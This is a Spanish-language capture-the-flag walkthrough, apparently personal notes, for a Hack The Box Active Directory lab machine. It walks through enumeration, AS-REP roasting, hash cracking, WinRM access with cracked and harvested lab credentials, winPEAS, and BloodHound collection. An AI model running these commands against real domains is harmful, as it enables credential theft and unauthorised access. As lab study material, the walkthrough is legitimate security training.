`nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.175 -oG allPorts`
`nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49677,49689,49697 -sCV 10.10.10.175 -oN targeted`
 ``` python
53/tcp    open  domain       
80/tcp    open  http         
|_http-server-header: Microso
|_http-title: Egotistical Ban
| http-methods: 
|_  Potentially risky methods
88/tcp    open  kerberos-sec 
135/tcp   open  msrpc        
139/tcp   open  netbios-ssn  
389/tcp   open  ldap         
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         
3269/tcp  open  tcpwrapped
5985/tcp  open  http         
|_http-server-header: Microso
|_http-title: Not Found
9389/tcp  open  mc-nmf       
49668/tcp open  msrpc        
49673/tcp open  ncacn_http   
49674/tcp open  msrpc        
49677/tcp open  msrpc        
49689/tcp open  msrpc        
49697/tcp open  msrpc        
 ```


#### 445
`netexec smb $IP`
Añadimos el dominio de la maquina a `/etc/host`
`netexec smb $IP --shares`
`smbmap -H $IP`
`smbclient -L $IP -N`


#### 135
`rpcclient -U "" $IP -N`
	`enumdomusers` No nos deja acceder


#### 389
En hacktricks buscamos por el puerto y ahí buscamos por `ldapsearch` para ver diferentes formas de enumerar el servicio

`ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts`

```
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL

```

`ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL' | grep "dn: CN="`

```ad-hint
CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
```

Para validar si existe nos crearemos un `.txt`, con diferentes combinaciones del usuario

Enumeraríamos a través de kerberos con la herramienta [[KERBRUTE]]
`kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc $IP users.txt`
```ad-hint
[+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
```

Si nos hubiese aparecido un hash es que es vulnerable a `AS_REP ROAST`

Tambien podemos enumerar usuariios con:
`impacket-GetNPUsers -no-pass -usersfile users.txt EGOTISTICAL-BANK.LOCAL/`

Vamos a comprobrobar si se han reutilizado credenciales, 
`netexec smb $IP -u 'hsmith' -p 'hsmith'` No hay reutilización de credenciales


#### 53
`dig @10.10.10.175 EGOTISTICAL-BANK.LOCAL ns`
`dig @10.10.10.175 EGOTISTICAL-BANK.LOCAL mx`
`dig @10.10.10.175 EGOTISTICAL-BANK.LOCAL axfr`

#### 80

Encontramos en `About Us` nombres de usuarios que añadiremos con el mismo formato que el encontrado anteriormente al documento de `users.txt`
```
hsmith
fsmith
scoins
hbear
btayler
skerb
```

Volvemos a usar [[KERBRUTE]] para identificar usuarios los usuarios encontrados:
`kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc $IP users.txt`

También lo podemos hacer con
`impacket-GetNPUsers -no-pass -usersfile users.txt EGOTISTICAL-BANK.LOCAL/`

Y nos mostraría que el usuario `fsmith` no cuenta con preautenticacion de kerberos y nos muestra el hash del Ticket Granting Ticket. Siendo asi vulnerable a `ASREPRoasting`

```ad-hint
ASREPRoasting en el usuario fsmith
```

Para crakeralo por fuerza bruta lo guardamos en un fichero llamado hash
Esta vez vamos ha crackearlo con la GPU directamente desde la máquina Windows, nos conectaremos por ssh a nuestra maquina HOST y navegaremos al directorio donde esta instalado el [[HASHCAT]], en nuestra maquina atacante levantamos un servicio SMB
`impacket-smbserver smbFolder $(pwd) -smb2support`

Y desde la máquina host obtenemos el archivo con el hash
`copy \\192.168.1.21\smbFolder\hash hash`

Ahora ejecutaremos [[HASHCAT]]
`hashcat.exe -m 18200 -a 0 hash rockyou.txt`

Nos muestra la contraseña del usuario `fsmith`
```ad-hint
fsmith::Thestrokes23
```

Comprobamos que la contraseña pertenezca al usuario 
`netexec smb $IP -u 'fsmith' -p 'Thestrokes23'`

Como el puerto `5985` esta abierto que corresponde al servicio de administración remota de Windows, así que vamos a intentar conectarnos con [[CRACKMAPEXEC-NETEXEC]]
`netexec winrm $IP -u 'fsmith' -p 'Thestrokes23'`

Nos aparece un `Pwn3d!` queriendo decir que este usuario pertenece al grupo de administración remota de la maquina pudiendo así acceder con [[EVIL_WINRM]]
`evil-winrm -i $IP -u 'fsmith' -p 'Thestrokes23'`

Obtenemos una consola interactiva


### Escalada de privilegios
`whoami /priv`
`whoami /all`

Ver que mas usuarios pertenecen al grupo de `REMOTE MANAGEMENT`
`net localgroup "Remote Management Users"`

Encontramos al usuario `svc_loanmgr`

Enumerar las credenciales del usuario:
Usaremos `WinPEAS` que nos lo transferiremos a la maquina atacante
`upload /home/jalag/Workzone/VPN/HTB/Machines/WorkLab/content/winPEAS.exe`

Ejecutamos el `winPEAS`
`.\winPEAS.exe`

Encontramos unas credenciales
```ad-hint
svc_loanmgr::Moneymakestheworldgoround!
```

Verificamos si las credenciales son validas
`netexec smb $IP -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'` y nos muestra que son validas

Verificamos si corresponde al grupo de Remote Management
`netexec winrm $IP -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'`

Y ahora nos conectamos con [[EVIL_WINRM]]
`evil-winrm -i $IP -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!`


### Escalada de privilegios

Empezaremos a enumerar ahora con `BLOODHOUND`
Primero en la terminal como el usuario `svc_loanmgr` haremos una recopilación del sistema
Usaremos la utilidad del siguiente GitHub `https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1`

Nos lo traemos a nuestra maquina host
`wget https://raw.githubusercontent.com/puckiestyle/powershell/refs/heads/master/SharpHound.ps1`

Creamos una carpeta en la maquina victima en `Windows/Temp/Privesc` y nos traemos el archivo
`upload /home/jalag/Workzone/VPN/HTB/Machines/WorkLab/content/SharpHound.ps1`

Ahora lo ejecutamos
`Import-Module .\SharpHound.ps1`
`Invoke-BloodHound -CollectionMethod All`

Nos genera un comprimido que nos lo pasamos a nuestra maquina atacante
`download 20251016185335_BloodHound.zip bloodhound.zip`

Este archivo le subiremos a `BLOODHOUND`
